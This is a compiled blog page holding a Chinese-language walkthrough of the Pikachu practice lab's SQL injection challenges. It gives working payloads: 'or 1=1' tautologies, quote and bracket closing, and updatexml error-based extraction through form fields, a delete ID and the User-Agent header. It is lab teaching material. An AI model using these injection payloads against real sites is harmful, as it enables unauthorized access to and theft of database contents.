import{_ as t,c as l,b as i,a,d as s,e as r,r as p,o as d}from"./app-CUDFWA7u.js";const c="/blog/assets/image-20220929162207333-AF2ZLVqz.png",o="/blog/assets/image-20220929164210067-By2iyQYa.png",h="/blog/assets/image-20220929164824093-BkqsEB9d.png",m="/blog/assets/image-20220929164927029-BZ640C6y.png",g="/blog/assets/image-20220929165253583-BVp8fXe9.png",u="/blog/assets/image-20220929165500648-CPc5xO0k.png",b="/blog/assets/image-20220929170111909-D5nowqfv.png",v="/blog/assets/image-20220929170434689-CnFsRevx.png",x="/blog/assets/image-20220929181600162-CGwu3NcK.png",k="/blog/assets/image-20220929182435730-CGxV9Ujj.png",_="/blog/assets/image-20220929185500286-BDaeaVV2.png",f="/blog/assets/image-20220929185738886-BhwbsCGR.png",y="/blog/assets/image-20220929191739875-J-H624so.png",w="/blog/assets/image-20220929191759629-CnZXVfvW.png",q="/blog/assets/image-20220929193403953-6WHhiqOh.png",P="/blog/assets/image-20220929193513674-Cci8Gqtc.png",j={},B={href:"https://blog.csdn.net/elephantxiang/article/details/115771540",target:"_blank",rel:"noopener noreferrer"};function S(C,e){const n=p("ExternalLinkIcon");return d(),l("div",null,[e[2]||(e[2]=i('<h1 id="sql-inject" tabindex="-1"><a class="header-anchor" href="#sql-inject"><span>SQL Inject</span></a></h1><h2 id="数字型注入" tabindex="-1"><a class="header-anchor" href="#数字型注入"><span>数字型注入</span></a></h2><h3 id="分析" tabindex="-1"><a class="header-anchor" href="#分析"><span>分析</span></a></h3><p>选个数字查询，URL没变化，看 BP 可见是通过 POST 传递的</p><p><img src="'+c+`" alt="image-20220929162207333"></p><p>猜测查询语句：</p><div class="language-sql line-numbers-mode" data-highlighter="prismjs" data-ext="sql" data-title="sql"><pre><code><span class="line"><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">,</span> email <span class="token keyword">from</span> 表名 <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="利用" tabindex="-1"><a class="header-anchor" href="#利用"><span>利用</span></a></h3><p>先直接试试构造非法语句 改一下id <code>1 or 1=1</code></p><div class="language-sql line-numbers-mode" data-highlighter="prismjs" data-ext="sql" data-title="sql"><pre><code><span class="line"><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">,</span> email <span class="token keyword">from</span> 表名 <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>搞定，用户全出来了</p><p><img src="`+o+'" alt="image-20220929164210067"></p><h2 id="字符型注入" tabindex="-1"><a class="header-anchor" href="#字符型注入"><span>字符型注入</span></a></h2><h3 id="分析-1" tabindex="-1"><a class="header-anchor" href="#分析-1"><span>分析</span></a></h3><p>先随便提交个数据，发现是 GET 传递</p><p><img src="'+h+'" alt="image-20220929164824093"></p><p>根据上一步，提交上一步的 vince 用户试试</p><p><img src="'+m+`" alt="image-20220929164927029"></p><p>猜测查询语句</p><div class="language-sql line-numbers-mode" data-highlighter="prismjs" data-ext="sql" data-title="sql"><pre><code><span class="line"><span class="token keyword">select</span> uid<span class="token punctuation">,</span> email <span class="token keyword">from</span> 表名 <span class="token keyword">where</span> name<span class="token operator">=</span><span class="token string">&#39;vince&#39;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="利用-1" tabindex="-1"><a class="header-anchor" href="#利用-1"><span>利用</span></a></h3><p>构造 Payload，把 name 给闭合掉，并添加 <code>or 1=1 #</code></p><p>搞定</p><p><img src="`+g+`" alt="image-20220929165253583"></p><h2 id="搜索型注入" tabindex="-1"><a class="header-anchor" href="#搜索型注入"><span>搜索型注入</span></a></h2><h3 id="分析-2" tabindex="-1"><a class="header-anchor" href="#分析-2"><span>分析</span></a></h3><p>与字符型同理，除了此处的 SQL 查询执行的是模糊查询，但这并不影响，因为可以闭合然后注释掉</p><h3 id="利用-2" tabindex="-1"><a class="header-anchor" href="#利用-2"><span>利用</span></a></h3><p>构造 Payload</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">vin&#39; or 1=1 #</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="`+u+'" alt="image-20220929165500648"></p><h2 id="xx型注入" tabindex="-1"><a class="header-anchor" href="#xx型注入"><span>xx型注入</span></a></h2><h3 id="分析-3" tabindex="-1"><a class="header-anchor" href="#分析-3"><span>分析</span></a></h3><p>老规矩，直接先试试 <code>vince&#39; or 1=1 #</code></p><p>提示缺了个右符号，那应该就是右括号了吧</p><p><img src="'+b+`" alt="image-20220929170111909"></p><h3 id="利用-3" tabindex="-1"><a class="header-anchor" href="#利用-3"><span>利用</span></a></h3><p>构造 Payload</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">vince&#39;) or 1=1 #</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="`+v+'" alt="image-20220929170434689"></p><h2 id="insert-update-注入" tabindex="-1"><a class="header-anchor" href="#insert-update-注入"><span>&quot;insert/update&quot;注入</span></a></h2><p>随便注册个信息，BP 看包内的信息，可以看到六个数据项</p><p><img src="'+x+`" alt="image-20220929181600162"></p><h3 id="利用-4" tabindex="-1"><a class="header-anchor" href="#利用-4"><span>利用</span></a></h3><h4 id="insert注入" tabindex="-1"><a class="header-anchor" href="#insert注入"><span>insert注入</span></a></h4><p>利用报错注入</p><p>利用concat执行sql注入语句</p><p>使用updatexml报错信息将sql语句执行结果返回</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">&#39;or updatexml(1,concat(0x7e,database(),0x7e),0) or&#39;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="`+k+`" alt="image-20220929182435730"></p><h4 id="update注入" tabindex="-1"><a class="header-anchor" href="#update注入"><span>update注入</span></a></h4><p>Payload ：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">&#39;or updatexml(1,concat(0x7e,database(),0x7e),0) or&#39;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="`+_+'" alt="image-20220929185500286"></p><h2 id="delete注入" tabindex="-1"><a class="header-anchor" href="#delete注入"><span>delete注入</span></a></h2><h3 id="分析-4" tabindex="-1"><a class="header-anchor" href="#分析-4"><span>分析</span></a></h3><p>删除留言的时候传递了 ID</p><p><img src="'+f+`" alt="image-20220929185738886"></p><h3 id="利用-5" tabindex="-1"><a class="header-anchor" href="#利用-5"><span>利用</span></a></h3><p>BP 改包</p><p>Payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">id=57 or updatexml(1,concat(0x7e,(select database()),0x7e),1)</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>注意要编码一下</p><p><img src="`+y+'" alt="image-20220929191739875"></p><p><img src="'+w+'" alt="image-20220929191759629"></p><h2 id="http头注入" tabindex="-1"><a class="header-anchor" href="#http头注入"><span>http头注入</span></a></h2><h3 id="分析-5" tabindex="-1"><a class="header-anchor" href="#分析-5"><span>分析</span></a></h3><p>登录进去看看，内容是来自 HTTP Header</p><p><img src="'+q+`" alt="image-20220929193403953"></p><h3 id="利用-6" tabindex="-1"><a class="header-anchor" href="#利用-6"><span>利用</span></a></h3><p>BP 改包，在 UserAgent 末尾加上</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">&#39; or updatexml(1,concat(0x7e,database()),1) or&#39;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="`+P+'" alt="image-20220929193513674"></p><h2 id="基于boolian的盲注-待补" tabindex="-1"><a class="header-anchor" href="#基于boolian的盲注-待补"><span>基于boolian的盲注（待补）</span></a></h2><h2 id="基于时间的盲注-待补" tabindex="-1"><a class="header-anchor" href="#基于时间的盲注-待补"><span>基于时间的盲注（待补）</span></a></h2><h2 id="wide-byte注入-待补" tabindex="-1"><a class="header-anchor" href="#wide-byte注入-待补"><span>wide byte注入（待补）</span></a></h2>',76)),a("p",null,[e[1]||(e[1]=s("参考：")),a("a",B,[e[0]||(e[0]=s("pikachu SQL注入 (皮卡丘漏洞平台通关系列)_仙女象的博客-CSDN博客_pikachu sql注入")),r(n)])])])}const I=t(j,[["render",S]]),L=JSON.parse('{"path":"/blogs/tech/security/web/Pikachu/04_Sql_Inject.html","title":"PiKachu - SQL Inject","lang":"en-US","frontmatter":{"title":"PiKachu - SQL Inject","date":"2022-09-29T00:00:00.000Z","tags":["Web","security"],"categories":["tech"]},"headers":[{"level":2,"title":"数字型注入","slug":"数字型注入","link":"#数字型注入","children":[{"level":3,"title":"分析","slug":"分析","link":"#分析","children":[]},{"level":3,"title":"利用","slug":"利用","link":"#利用","children":[]}]},{"level":2,"title":"字符型注入","slug":"字符型注入","link":"#字符型注入","children":[{"level":3,"title":"分析","slug":"分析-1","link":"#分析-1","children":[]},{"level":3,"title":"利用","slug":"利用-1","link":"#利用-1","children":[]}]},{"level":2,"title":"搜索型注入","slug":"搜索型注入","link":"#搜索型注入","children":[{"level":3,"title":"分析","slug":"分析-2","link":"#分析-2","children":[]},{"level":3,"title":"利用","slug":"利用-2","link":"#利用-2","children":[]}]},{"level":2,"title":"xx型注入","slug":"xx型注入","link":"#xx型注入","children":[{"level":3,"title":"分析","slug":"分析-3","link":"#分析-3","children":[]},{"level":3,"title":"利用","slug":"利用-3","link":"#利用-3","children":[]}]},{"level":2,"title":"\\"insert/update\\"注入","slug":"insert-update-注入","link":"#insert-update-注入","children":[{"level":3,"title":"利用","slug":"利用-4","link":"#利用-4","children":[]}]},{"level":2,"title":"delete注入","slug":"delete注入","link":"#delete注入","children":[{"level":3,"title":"分析","slug":"分析-4","link":"#分析-4","children":[]},{"level":3,"title":"利用","slug":"利用-5","link":"#利用-5","children":[]}]},{"level":2,"title":"http头注入","slug":"http头注入","link":"#http头注入","children":[{"level":3,"title":"分析","slug":"分析-5","link":"#分析-5","children":[]},{"level":3,"title":"利用","slug":"利用-6","link":"#利用-6","children":[]}]},{"level":2,"title":"基于boolian的盲注（待补）","slug":"基于boolian的盲注-待补","link":"#基于boolian的盲注-待补","children":[]},{"level":2,"title":"基于时间的盲注（待补）","slug":"基于时间的盲注-待补","link":"#基于时间的盲注-待补","children":[]},{"level":2,"title":"wide byte注入（待补）","slug":"wide-byte注入-待补","link":"#wide-byte注入-待补","children":[]}],"git":{"createdTime":1766928673000,"updatedTime":1766928673000,"contributors":[{"name":"PPPerryPan","email":"perrypan0123@outlook.com","commits":1}]},"filePathRelative":"blogs/tech/security/web/Pikachu/04_Sql_Inject.md"}');export{I as comp,L as data};
